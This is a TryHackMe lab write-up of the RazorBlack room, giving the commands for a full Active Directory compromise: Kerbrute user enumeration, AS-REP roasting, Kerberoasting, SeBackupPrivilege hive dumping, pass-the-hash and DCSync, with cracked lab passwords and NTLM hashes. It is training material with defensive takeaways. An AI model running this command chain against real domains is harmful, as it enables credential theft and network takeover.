
# RazorBlack — TryHackMe Writeup

> Active Directory penetration testing room simulating a domain compromise against `raz0rblack.thm`.

![Difficulty](https://img.shields.io/badge/Difficulty-medium-red)
![Category](https://img.shields.io/badge/Category-Active%20Directory-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-purple)

## Overview

| | |
|---|---|
| **Target** | `10.66.169.238` (Domain Controller — `HAVEN-DC`) |
| **Domain** | `raz0rblack.thm` |
| **Objective** | Full domain compromise |
| **Attack path** | AS-REP Roasting → Kerberoasting → `SeBackupPrivilege` abuse → NTDS.dit extraction → Pass-the-Hash |

> **Note:** Flag values and some intermediate steps have been intentionally omitted from this writeup to avoid spoiling the room for others attempting it. Screenshots of command output to be added.

## Skills Demonstrated

- Active Directory enumeration without authentication
- Username enumeration via Kerberos (Kerbrute)
- AS-REP Roasting and Kerberoasting attacks
- Offline hash cracking (Hashcat)
- Windows privilege abuse (`SeBackupPrivilege`)
- Registry hive extraction and offline credential dumping
- DCSync attack via `secretsdump.py`
- Pass-the-Hash lateral movement

## Tools Used

`nmap` · `ldapsearch` · `enum4linux-ng` · `netexec (nxc)` · `impacket-samrdump` · `kerbrute` · `impacket-GetNPUsers` · `impacket-GetUserSPNs` · `hashcat` · `evil-winrm` · `impacket-secretsdump`

---

## 1. Reconnaissance

Initial port and service scan against the target:

```bash
nmap -sV -sC 10.66.169.238 -oA nmap_report
```

Results identified the host as a Domain Controller named **HAVEN-DC**, part of the **raz0rblack.thm** domain.

Domain confirmation via LDAP:

```bash
ldapsearch -x -H ldap://10.66.169.238 -s base
```

### Null Session Check

Attempted to validate anonymous/null session access to SMB:

```bash
nxc smb 10.66.169.238 -u '' -p ''
```

❌ Null session not permitted.

### General Enumeration

```bash
enum4linux-ng -U -S -P 10.66.169.238
```

Confirmed domain details via RPC:

```
[+] Domain: RAZ0RBLACK
[+] Domain SID: S-1-5-21-3403444377-2687699443-13012745
[+] Membership: domain member
```

Further attempts with RPC and LDAP-based user enumeration were unsuccessful:

```bash
impacket-samrdump 10.66.169.238
netexec smb 10.66.169.238 -u '' -p '' --users
ldapsearch -x -H ldap://10.66.169.238 -b "DC=raz0rblack,DC=thm" "(objectClass=user)" sAMAccountName
```

## 2. Username Enumeration

With standard enumeration methods blocked, pivoted to Kerberos-based username enumeration using **Kerbrute**:

```bash
kerbrute userenum -d raz0rblack.thm --dc 10.64.140.169 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100 -o valid_users.txt
```

> The initial run against the full wordlist caused the target to become unresponsive — re-ran against a fresh instance with a reduced thread count and a smaller wordlist.

Valid accounts discovered:

- `twilliams`
- `sbradley`

## 3. AS-REP Roasting

Checked the discovered accounts for Kerberos pre-authentication disabled:

```bash
impacket-GetNPUsers raz0rblack.thm/ -usersfile users.txt -format hashcat -dc-ip 10.64.140.169 -outputfile hashes_asrep.txt
```

Obtained an AS-REP hash for `twilliams`. Cracked offline:

```bash
hashcat -m 18200 hashes_asrep.txt /usr/share/wordlists/rockyou.txt
```

✅ **Credentials obtained:** `twilliams:roastpotatoes`

## 4. Kerberoasting

Using the authenticated `twilliams` account, performed Kerberoasting to retrieve service account hashes:

```bash
impacket-GetUserSPNs raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.64.140.169 -request -outputfile hashes_kerberoast.txt
```

Retrieved a TGS hash for `xyan1d3` (member of **Remote Management Users**). Cracked with Hashcat:

```bash
hashcat -m 13100 hashes_kerberoast.txt /usr/share/wordlists/rockyou.txt
```

✅ **Credentials obtained:** `xyan1d3:cyanide9amine5628`

## 5. Initial Foothold

`xyan1d3` belongs to the **Remote Management Users** group, allowing a WinRM session:

```bash
evil-winrm -i 10.64.140.169 -u xyan1d3 -p 'cyanide9amine5628'
```

✅ Shell obtained as `raz0rblack\xyan1d3`.

## 6. Privilege Escalation — `SeBackupPrivilege` Abuse

Enumerating current privileges:

```powershell
whoami /all
```

Identified that `xyan1d3` holds **`SeBackupPrivilege`**:

```
Privilege Name             Description                    State
===========================  ==============================  =======
SeBackupPrivilege           Back up files and directories   Enabled
SeRestorePrivilege          Restore files and directories   Enabled
```

This privilege bypasses standard Windows ACLs entirely, allowing arbitrary file reads — including the `SAM`/`SYSTEM` registry hives (and, on a DC, the `NTDS.dit` database containing every domain credential).

Dumped the local SAM and SYSTEM hives, bypassing filesystem locks:

```powershell
mkdir C:\Windows\Tasks\privesc
reg save HKLM\SAM C:\Windows\Tasks\privesc\sam.hive
reg save HKLM\SYSTEM C:\Windows\Tasks\privesc\system.hive
```

Downloaded both hives locally via Evil-WinRM's built-in transfer:

```
download sam.hive
download system.hive
```

## 7. Local Credential Extraction

Extracted local account hashes offline:

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
```

## 8. Pass-the-Hash → Domain Compromise

Authenticated as the local `Administrator` using the extracted NTLM hash:

```bash
evil-winrm -i 10.64.140.169 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
```

✅ `whoami` confirms `raz0rblack\administrator`.

With Administrator access on the DC, performed a **DCSync attack** to dump every credential in the domain:

```bash
impacket-secretsdump raz0rblack.thm/Administrator@10.64.140.169 -hashes :9689931bed40ca5a2ce1218210177f0c -just-dc
```

This exposed NTLM hashes for all remaining domain users, including `sbradley` and `lvetrova`.

## 9. Lateral Movement

Targeted extraction and Pass-the-Hash for the remaining users of interest:

```bash
impacket-secretsdump raz0rblack.thm/Administrator@10.67.190.144 -hashes :9689931bed40ca5a2ce1218210177f0c -just-dc-user lvetrova
evil-winrm -i 10.67.190.144 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
```

```bash
impacket-secretsdump raz0rblack.thm/Administrator@10.67.190.144 -hashes :9689931bed40ca5a2ce1218210177f0c -just-dc-user sbradley
evil-winrm -i 10.67.190.144 -u sbradley -H 351c839c5e02d1ed0134a383b628426e
```

✅ Full domain compromise achieved — administrative access across the environment.

---

## Attack Chain Summary

```
No creds
   │ Kerbrute username enum (Kerberos pre-auth)
   ▼
twilliams (AS-REP Roast → cracked)
   │ Kerberoasting
   ▼
xyan1d3 (TGS hash → cracked → WinRM access)
   │ SeBackupPrivilege → SAM/SYSTEM dump
   ▼
Local Administrator (NTLM hash → Pass-the-Hash)
   │ DCSync (secretsdump -just-dc)
   ▼
Full Domain Compromise (all user hashes)
```

## Key Takeaways

- When standard anonymous enumeration (null sessions, RPC, LDAP) is locked down, **Kerberos pre-authentication is still a valid enumeration surface** via tools like Kerbrute.
- **AS-REP Roasting and Kerberoasting** remain highly effective even against environments with otherwise hardened enumeration.
- A single over-privileged account with **`SeBackupPrivilege`** can lead directly to full domain compromise — this privilege is often overlooked in access reviews because it doesn't look as "dangerous" as domain admin rights.
- **DCSync** via a single compromised Administrator account is enough to extract every credential in the domain, underscoring the importance of tiered administration and limiting standing DA/local admin access.

---

*Writeup by [MessiasDev14011](https://github.com/MessiasDev14011) — TryHackMe: RazorBlack*
